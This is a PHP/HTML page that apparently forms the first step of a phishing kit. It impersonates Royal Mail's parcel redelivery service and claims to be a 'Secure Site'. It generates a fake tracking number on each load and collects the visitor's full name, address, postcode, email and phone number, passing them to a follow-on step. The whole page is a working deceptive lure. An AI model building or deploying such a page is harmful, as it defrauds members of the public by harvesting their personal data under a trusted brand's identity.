<?php require 'config.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Royal Mail - Redeliver your parcel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background:#f4f4f4; }
        .rm-header { background:#003087; color:white; padding:20px 0; }
        .card { border:3px solid #003087; border-radius:8px; }
    </style>
</head>
<body>
<div class="rm-header text-center">
    <h2>Royal Mail</h2>
    <h5>Redelivery & Reschedule</h5>
</div>

<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-6">
            <div class="card shadow">
                <div class="card-header bg-primary text-white text-center">
                    <strong>Your parcel needs a new delivery date</strong>
                </div>
                <div class="card-body">
                    <p class="text-center">Tracking: <strong>RM<?php echo rand(100000000,999999999); ?>UK</strong></p>
                    
                    <form action="step1.php" method="POST">
                        <div class="mb-3">
                            <label class="form-label">Full Name</label>
                            <input type="text" name="fullname" class="form-control" required>
                        </div>
                        <div class="mb-3">
                            <label class="form-label">Full Delivery Address</label>
                            <textarea name="address" class="form-control" rows="3" required></textarea>
                        </div>
                        <div class="row">
                            <div class="col-6">
                                <input type="text" name="postcode" class="form-control" placeholder="Postcode" required>
                            </div>
                            <div class="col-6">
                                <input type="email" name="email" class="form-control" placeholder="Email Address" required>
                            </div>
                        </div>
                        <div class="mb-3 mt-3">
                            <label>Phone Number</label>
                            <input type="tel" name="phone" class="form-control" required>
                        </div>
                        <button type="submit" class="btn btn-primary w-100">Continue →</button>
                    </form>
                    <small class="text-muted d-block text-center mt-3">© Royal Mail 2025 • Secure Site</small>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>